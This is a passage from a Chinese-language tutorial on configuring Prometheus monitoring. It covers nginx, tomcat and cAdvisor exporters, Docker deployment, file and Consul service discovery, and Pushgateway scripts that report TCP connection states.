-nginx.scrape_uri=http://10.0.0.211/status/format/json<br></code></pre></td></tr></table></figure><p><strong>配置prometheus采集nginx数据</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 修改配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&quot;nginx-exporter&quot;</span><br>    metrics_path: <span class="hljs-string">&quot;/status/format/prometheus&quot;</span><br>    static_configs:<br>      - targets:<br>          - <span class="hljs-string">&quot;10.0.0.211:80&quot;</span><br><br>  - job_name: <span class="hljs-string">&quot;nginx-vts-exporter&quot;</span><br>    static_configs:<br>      - targets:<br>          - <span class="hljs-string">&quot;10.0.0.211:9913&quot;</span><br>          <br>[root@prometheus-server31 ~]# rr<br><br>2 访问Prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>3 导入grafana模板<br>2949<br></code></pre></td></tr></table></figure><h2 id="19、监控tomcat服务"><a href="#19、监控tomcat服务" class="headerlink" title="19、监控tomcat服务"></a>19、监控tomcat服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 基于Dockerfile构建tomcat-exporter<br>[root@jenkins211 ~]# git <span class="hljs-built_in">clone</span> https://gitee.com/jasonyin2020/tomcat-exporter.git<br><br>2.编译镜像<br>[root@jenkins211 ~]# <span class="hljs-built_in">cd</span> tomcat-exporter/<br>[root@jenkins211 tomcat-exporter]# <span class="hljs-built_in">chmod</span> +x build.sh <br>[root@jenkins211 tomcat-exporter]# ./build.sh <br><br>3 运行tomcat镜像<br>[root@jenkins211 ~]# docker run -dp 18080:8080 --name tomcat-server registry.cn-hangzhou.aliyuncs.com/yinzhengjie-k8s/tomcat9-app:v1<br><br>4.访问tomcat应用<br>http://10.0.0.211:18080/metrics/<br>http://10.0.0.211:18080/myapp/ <br><br>5.配置prometheus监控tomcat应用<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&quot;tomcat-exporter&quot;</span><br>    static_configs:<br>      - targets: <br>          - <span class="hljs-string">&quot;10.0.0.211:18080&quot;</span><br>          <br>5.2 导入grafana模板 <br>https://github.com/nlighten/tomcat_exporter/blob/master/dashboard/example.json<br></code></pre></td></tr></table></figure><h2 id="20、监控容器cadvisor"><a href="#20、监控容器cadvisor" class="headerlink" title="20、监控容器cadvisor"></a>20、监控容器cadvisor</h2><p>它是一个正在运行的守护进程，用于收集、聚合、处理和导出有关正在运行的容器的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">官网地址：https://github.com/google/cadvisor<br><br>导入镜像<br>[root@jenkins211 ~]# docker load -i cadvisor-amd64-0.49.1.tar.gz <br><br>运行容器<br>[root@jenkins211 ~]# <br>VERSION=v0.49.1 <br>docker run \<br>  -v /:/rootfs:ro \<br>  -v /var/run:/var/run:ro \<br>  -v /sys:/sys:ro \<br>  -v /var/lib/docker/:/var/lib/docker:ro \<br>  -v /dev/disk/:/dev/disk:ro \<br>  -p 28080:8080 \<br>  -d \<br>  --name=cadvisor \<br>  --privileged \<br>  --device=/dev/kmsg \<br>  gcr.io/cadvisor/cadvisor-amd64:<span class="hljs-variable">$VERSION</span><br>54149a621e6bcd9a612fc0b3c755eea91d7466b52bf732a92816c22993b2d635<br><br>prometheus采集cAdvisor容器<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml<br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&quot;prometheus-cAdvisor&quot;</span><br>    static_configs:<br>    - targets:<br>        - <span class="hljs-string">&quot;10.0.0.211:28080&quot;</span><br>        <br>[root@prometheus-server31 ~]# rr<br>10.0.0.211:28080/metrics<br><br>访问WebUI验证配置是否生效<br>http://10.0.0.31:9090/targets<br><br>导入grafana模板<br>315  <br>10619<br><br><br>grafana的官方优化思路-对于容器出现小数的情况<br>针对10619模板，当容器数量增多时，如果容器出现小数点，微调即可。<br><br>Value options  ---&gt;  <span class="hljs-string">&quot;Last*&quot;</span><br></code></pre></td></tr></table></figure><h2 id="21、基于docker部署Prometheus相关组件"><a href="#21、基于docker部署Prometheus相关组件" class="headerlink" title="21、基于docker部署Prometheus相关组件"></a>21、基于docker部署Prometheus相关组件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.部署Prometheus -server <br>[root@jenkins211 ~]# docker run -d --network host --name prometheus-server prom/prometheus:v2.53.2 <br><br>2.部署node-exporter<br>[root@jenkins211 ~]# docker run  -d --name node-exporter --network host  prom/node-exporter:v1.8.2 <br><br>3.配置Prometheus server监控node-exporter<br>修改配置文件<br>[root@jenkins211 ~]# docker <span class="hljs-built_in">exec</span> -it prometheus-server sh<br>/prometheus $ <br>/prometheus $ vi /etc/prometheus/prometheus.yml <br>...<br>                                         <br>  - job_name: <span class="hljs-string">&quot;prometheus-node-exporter&quot;</span> <br>    static_configs:                     <br>    - targets:                          <br>      - 10.0.0.211:9100<br>      <br>重新加载配置<br>[root@jenkins211 ~]# docker restart prometheus-server <br>验证是否加载成功<br>http://10.0.0.211:9090/targets<br><br>4.部署grafana组件<br>部署 <br>[root@jenkins211 ~]# docker run -d --name grafana --network host grafana/grafana:9.5.21 <br>访问测试 <br>http://10.0.0.211:3000<br><br><br>5.部署pushgateway组件<br>部署 <br>[root@jenkins211 ~]# docker run -d --name pushgateway --network host prom/pushgateway:v1.9.0 <br>访问测试 <br>http://10.0.0.211:9091/<br><br>6.部署alertmanager组件<br>部署<br>[root@jenkins211 ~]# docker run -d --name alertmanager --network host prom/alertmanager:v0.27.0 <br>访问测试 <br>http://10.0.0.211:9093/#/alerts<br></code></pre></td></tr></table></figure><h2 id="22、文件发现服务"><a href="#22、文件发现服务" class="headerlink" title="22、文件发现服务"></a>22、文件发现服务</h2><p>静态配置：之前使用的都是静态分析，每次都要重启服务或者热加载文件</p><p>动态配置：可以动态发现服务，无需热加载文件</p><p>动态配置可分为json文件和yaml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.修改prometheus的配置文件 <br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>...<br>  - job_name: <span class="hljs-string">&#x27;file-service-discovery-json&#x27;</span><br>    <span class="hljs-comment"># 基于文件的服务发现为动态发现</span><br>    file_sd_configs:<br>        <span class="hljs-comment"># 指定文件路径</span><br>      - files:<br>          - /softwares/prometheus-2.53.2.linux-amd64/config/*.json<br><br>  - job_name: <span class="hljs-string">&#x27;file-service-discovery-yaml&#x27;</span><br>    file_sd_configs:<br>      - files:<br>          - /softwares/prometheus-2.53.2.linux-amd64/config/*.yaml<br>          <br>          <br>2.重新加载配置 <br>[root@prometheus-server31 ~]# rr<br><br>3.访问WebUI验证配置是否生效<br>http://10.0.0.31:9090/config<br><br>4.创建配置文件模拟基于动态的监控<br>创建目录 <br>[root@prometheus-server31 ~]# <span class="hljs-built_in">mkdir</span> -pv /softwares/prometheus-2.53.2.linux-amd64/config<br>创建json文件监控41节点<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> /softwares/prometheus-2.53.2.linux-amd64/config/linux.json<br>[<br>  &#123;<br>    <span class="hljs-string">&quot;targets&quot;</span>: [ <span class="hljs-string">&quot;10.0.0.41:9100&quot;</span> ],<br>    <span class="hljs-string">&quot;labels&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;school&quot;</span>: <span class="hljs-string">&quot;cherry&quot;</span>,<br>      <span class="hljs-string">&quot;class&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>  &#125;<br>]<br>创建yaml文件监控42和43节点<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> /softwares/prometheus-2.53.2.linux-amd64/config/haha.yaml <br>- targets:<br>    - <span class="hljs-string">&#x27;10.0.0.42:9100&#x27;</span><br>    - <span class="hljs-string">&#x27;10.0.0.43:9100&#x27;</span><br>  labels:<br>    apps: yaml<br>    address: shahe<br>    <br>再次查看Prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>参考链接:https://prometheus.io/docs/prometheus/2.53/configuration/configuration/#file_sd_config<br></code></pre></td></tr></table></figure><h2 id="23、consul服务发现"><a href="#23、consul服务发现" class="headerlink" title="23、consul服务发现"></a><strong>23、consul服务发现</strong></h2><p>普罗米修斯服务端不能直接发现node节点，由consul服务端将node节点告诉过普罗米修斯服务端，consul也属于动态发现服务</p><p><strong>node节点部署consul集群</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 下载consul<br>wget https://releases.hashicorp.com/consul/1.19.1/consul_1.19.1_freebsd_amd64.zip<br><br>2 快速部署consul集群<br>下载consul<br>wget https://releases.hashicorp.com/consul/1.19.1/consul_1.19.1_freebsd_amd64.zip<br><br>解压consul<br>unzip consul_1.19.1_linux_amd64.zip  -d /usr/local/bin/<br><br>运行consul 集群<br>leader43:<br>consul agent -server -bootstrap -<span class="hljs-built_in">bind</span>=10.0.0.43 -data-dir=/softwares/consul -client=10.0.0.43 -ui<br><br><br>follower42:<br>consul agent  -<span class="hljs-built_in">bind</span>=10.0.0.42 -data-dir=/softwares/consul -client=10.0.0.42 -ui -retry-join=10.0.0.43<br><br><br>follower41:<br>consul agent -server -<span class="hljs-built_in">bind</span>=10.0.0.41 -data-dir=/softwares/consul -client=10.0.0.41 -ui -retry-join=10.0.0.43<br><br>访问console服务的WebUI，查看node节点<br>http://10.0.0.43:8500/ui/dc1/nodes<br></code></pre></td></tr></table></figure><p><strong>配置自动发现</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 修改prometheus的配置文件<br>vim /softwares/prometheus/prometheus.yml<br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&quot;consul-seriver-discovery&quot;</span><br>    <span class="hljs-comment"># 配置基于consul的服务发现</span><br>    consul_sd_configs:<br>        <span class="hljs-comment"># 指定consul的服务器地址，若不指定，则默认值为&quot;localhost:8500&quot;.</span><br>      - server: 10.0.0.43:8500<br>      - server: 10.0.0.42:8500<br>      - server: 10.0.0.41:8500<br>    relabel_configs:<br>        <span class="hljs-comment"># 匹配consul的源标签字段，表示服务名称</span><br>      - source_labels: [__meta_consul_service]<br>        <span class="hljs-comment"># 指定源标签的正则表达式，若不定义，默认值为&quot;(.*)&quot;</span><br>        regex: consul<br>        <span class="hljs-comment"># 执行动作为删除，默认值为&quot;replace&quot;,有效值有多种</span><br>        <span class="hljs-comment">#   https://prometheus.io/docs/prometheus/latest/configuration/configuration/#relabel_action</span><br>        action: drop<br><br>2 检查配置文件是否正确并重新加载配置<br>[root@prometheus-server31 ~]# check <br>[root@prometheus-server31 ~]# rr<br><br>3.被监控节点注册到console集群<br>注册节点<br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT -d <span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;prometheus-node42&quot;,&quot;name&quot;:&quot;prometheus-node42&quot;,&quot;address&quot;:&quot;10.0.0.42&quot;,&quot;port&quot;:9100,&quot;tags&quot;:[&quot;node-exporter&quot;],&quot;checks&quot;: [&#123;&quot;http&quot;:&quot;http://10.0.0.42:9100&quot;,&quot;interval&quot;:&quot;5m&quot;&#125;]&#125;&#x27;</span> http://10.0.0.42:8500/v1/agent/service/register<br><br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT -d <span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;prometheus-node41&quot;,&quot;name&quot;:&quot;prometheus-node42&quot;,&quot;address&quot;:&quot;10.0.0.41&quot;,&quot;port&quot;:9100,&quot;tags&quot;:[&quot;node-exporter&quot;],&quot;checks&quot;: [&#123;&quot;http&quot;:&quot;http://10.0.0.41:9100&quot;,&quot;interval&quot;:&quot;5m&quot;&#125;]&#125;&#x27;</span> http://10.0.0.42:8500/v1/agent/service/register<br><br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT -d <span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;prometheus-node43&quot;,&quot;name&quot;:&quot;prometheus-node42&quot;,&quot;address&quot;:&quot;10.0.0.43&quot;,&quot;port&quot;:9100,&quot;tags&quot;:[&quot;node-exporter&quot;],&quot;checks&quot;: [&#123;&quot;http&quot;:&quot;http://10.0.0.43:9100&quot;,&quot;interval&quot;:&quot;5m&quot;&#125;]&#125;&#x27;</span> http://10.0.0.42:8500/v1/agent/service/register<br><br>注销节点,在哪个节点注册就要在哪个节点注销<br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT http://10.0.0.42:8500/v1/agent/service/deregister/prometheus-node42<br><br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT http://10.0.0.42:8500/v1/agent/service/deregister/prometheus-node41<br><br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT http://10.0.0.42:8500/v1/agent/service/deregister/prometheus-node43<br><br><br></code></pre></td></tr></table></figure><h2 id="24、pushgateway自定义监控指标"><a href="#24、pushgateway自定义监控指标" class="headerlink" title="24、pushgateway自定义监控指标"></a>24、pushgateway自定义监控指标</h2><ul><li>Prometheus 采用 pull 模式，可能由于不在一个子网或者防火墙原因，导致 Prometheus 无法直接拉取各个 target 数据。</li><li>在监控业务数据的时候，需要将不同数据汇总, 由 Prometheus 统一收集。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.下载组件<br>wget https://github.com/prometheus/pushgateway/releases/download/v1.9.0/pushgateway-1.9.0.linux-amd64.tar.gz<br><br>2.解压软件包 <br>[root@prometheus-server32 ~]# tar xf pushgateway-1.9.0.linux-amd64.tar.gz  -C /softwares/<br><br>3.启动pushgateway组件 <br>[root@prometheus-server32 ~]# <span class="hljs-built_in">cd</span> /softwares/pushgateway-1.9.0.linux-amd64/<br>[root@prometheus-server32 pushgateway-1.9.0.linux-amd64]# ./pushgateway <br><br>4.访问pushgateway的WebUI<br>http://10.0.0.32:9091/#<br><br>5.Prometheus server监控pushgateway <br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: pushgateway<br>    <span class="hljs-comment"># 若不指定则默认值为false。</span><br>    <span class="hljs-comment"># 当设置为true时，若采集的指标包含中和内置的标签冲突时(比如job,instance)会覆盖。</span><br>    <span class="hljs-comment"># 当设置为false时，则不会覆盖，而是在标签前面加一个&quot;exported_*&quot;字段。</span><br>    honor_labels: <span class="hljs-literal">true</span><br>    static_configs:<br>    - targets:<br>      - 10.0.0.32:9091<br>      <br>[root@prometheus-server31 ~]# rr<br><br>7.推送数据到pushgateway组件<br>-------------------------<br>传递的数据是键值对，KEY一般是字符串类型，而value必须是一个数字类型。<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;student_online 97&quot;</span> | curl --data-binary @-  http://10.0.0.32:9091/metrics/job/student/instance/10.0.0.31<br><br>8.在Prometheus的WebUI验证数据是否推送成功<br>在Prometheus的WebUI中搜索“student_online”<br></code></pre></td></tr></table></figure><h2 id="25、prometheus监控tcp的12种状态案例"><a href="#25、prometheus监控tcp的12种状态案例" class="headerlink" title="25、prometheus监控tcp的12种状态案例"></a>25、prometheus监控tcp的12种状态案例</h2><p><strong>查看单个状态脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> /usr/local/bin/tcp_status.sh  <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># auther: cherry</span><br><span class="hljs-comment"># school: 001</span><br><span class="hljs-comment"># class: 002</span><br><span class="hljs-comment"># office: www.cherry.com</span><br><br><br><span class="hljs-comment"># 定义TCP的12种状态</span><br>ESTABLISHED_COUNT=0<br>SYN_SENT_COUNT=0<br>SYN_RECV_COUNT=0<br>FIN_WAIT1_COUNT=0<br>FIN_WAIT2_COUNT=0<br>TIME_WAIT_COUNT=0<br>CLOSE_COUNT=0<br>CLOSE_WAIT_COUNT=0<br>LAST_ACK_COUNT=0<br>LISTEN_COUNT=0<br>CLOSING_COUNT=0<br>UNKNOWN_COUNT=0<br><br><span class="hljs-comment"># 定义任务名称</span><br>JOB_NAME=tcp_status<br><span class="hljs-comment"># 定义实例名称</span><br>INSTANCE_NAME=prometheus32<br><span class="hljs-comment"># 定义pushgateway主机</span><br>HOST=10.0.0.32<br><span class="hljs-comment"># 定义pushgateway端口</span><br>PORT=9091<br><br><span class="hljs-comment"># TCP的12种状态</span><br>ALL_STATUS=(ESTABLISHED SYN_SENT SYN_RECV FIN_WAIT1 FIN_WAIT2 TIME_WAIT CLOSE CLOSE_WAIT LAST_ACK LISTEN CLOSING UNKNOWN)<br><br><span class="hljs-comment"># 声明一个关联数组,类似于py的dict,go的map</span><br><span class="hljs-built_in">declare</span> -A tcp_status<br><br><span class="hljs-comment"># 统计TCP的12种状态</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;ALL_STATUS[@]&#125;</span><br><span class="hljs-keyword">do</span><br>  temp=`netstat -untalp | grep <span class="hljs-variable">$i</span>  | <span class="hljs-built_in">wc</span> -l`<br>  tcp_status[<span class="hljs-variable">$&#123;i&#125;</span>]=<span class="hljs-variable">$temp</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># 将统计后的结果发送到pushgateway</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;!tcp_status[@]&#125;</span><br><span class="hljs-keyword">do</span> <br>   data=<span class="hljs-string">&quot;<span class="hljs-variable">$i</span> <span class="hljs-variable">$&#123;tcp_status[$i]&#125;</span>&quot;</span><br>   <span class="hljs-comment"># TODO: shell如果想要设计成相同key不同标签的方式存在问题，只会有最后一种状态被发送</span><br>   <span class="hljs-comment"># 目前我怀疑是pushgateway组件不支持同一个metrics中key所对应的value不同的情况。</span><br>   <span class="hljs-comment">#data=&quot;tcp_all_status&#123;status=\&quot;$i\&quot;&#125; $&#123;tcp_status[$i]&#125;&quot;</span><br>   <span class="hljs-comment">#echo $data</span><br>   <span class="hljs-built_in">echo</span> <span class="hljs-variable">$data</span> | curl --data-binary @-  http://<span class="hljs-variable">$&#123;HOST&#125;</span>:<span class="hljs-variable">$&#123;PORT&#125;</span>/metrics/job/<span class="hljs-variable">$&#123;JOB_NAME&#125;</span>/instance/<span class="hljs-variable">$&#123;INSTANCE_NAME&#125;</span><br>   <span class="hljs-comment"># sleep 1</span><br><span class="hljs-keyword">done</span><br><br>查看pushgateway<br>http://10.0.0.32:9091/#<br><br>普罗米修斯查看是否监测<br>ESTABLISHED.........<br><br></code></pre></td></tr></table></figure><p><strong>查看多个状态值</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> -A /usr/local/bin/tcp_status2.sh<br><span class="hljs-comment">#!/bin/bash$</span><br>$<br><span class="hljs-comment"># M-hM-.M-&gt;M-gM-=M-. Pushgateway M-gM-^ZM-^D URL$</span><br>pushgateway_url=<span class="hljs-string">&quot;http://10.0.0.42:9091/metrics/job/tcp_status&quot;</span>$<br><span class="hljs-keyword">time</span>=$(<span class="hljs-built_in">date</span> +%Y-%m-%d+%H:%M:%S)$<br>$<br>state=<span class="hljs-string">&quot;SYN-SENT SYN-RECV FIN-WAIT-1 FIN-WAIT-2 TIME-WAIT CLOSE CLOSE-WAIT LAST-ACK LISTEN CLOSING ESTAB&quot;</span>$<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  $state$<br> <span class="hljs-keyword">do</span>$<br> t=`ss -tan |grep <span class="hljs-variable">$i</span> |<span class="hljs-built_in">wc</span> -l`$<br> <span class="hljs-built_in">echo</span> tcp_connections&#123;state=\&quot;<span class="hljs-string">&quot;<span class="hljs-variable">$i</span>&quot;</span>\&quot;&#125; <span class="hljs-variable">$t</span> &gt;&gt;/tmp/tcp.txt$<br><span class="hljs-keyword">done</span>;$<br>$<br><span class="hljs-built_in">cat</span> /tmp/tcp.txt | curl --data-binary @- $pushgateway_url$<br><span class="hljs-built_in">rm</span> -rf  /tmp/tcp.txt$<br></code></pre></td></tr></table></figure><h2 id="26、黑盒监控服务"><a href="#26、黑盒监控服务" class="headerlink" title="26、黑盒监控服务"></a>26、黑盒监控服务</h2><p>黑盒监控服务也属于自定义的一种监控指标。</p><p>1.所谓的黑盒监控<br>黑盒监控指的是事故已经发生了，才监控到，表示的是从外部监控。举例例子: 网站挂了。</p><p>白盒监控指的是服务内部暴露出来的指标，可以更早的预判出问题可能发生的点。举例例子: 当前服务器的负载，队列等待处理的数量异常过高。</p><p>2.blackbox_exporter概述<br>blackbox exporter支持基于HTTP, HTTPS, DNS, TCP, ICMP, gRPC协议来对目标节点进行监控。</p><p>比如基于http协议我们可以探测一个网站的返回状态码为200判读服务是否正常。</p><p>比如基于TCP协议我们可以探测一个主机端口是否监听。</p><p>比如基于ICMP协议来ping一个主机的连通性。</p><p>比如基于gRPC协议来调用接口并验证服务是否正常工作。</p><p>比如基于DNS协议可以来检测域名解析。</p><p><strong>部署blackbox exporter</strong></p><figure 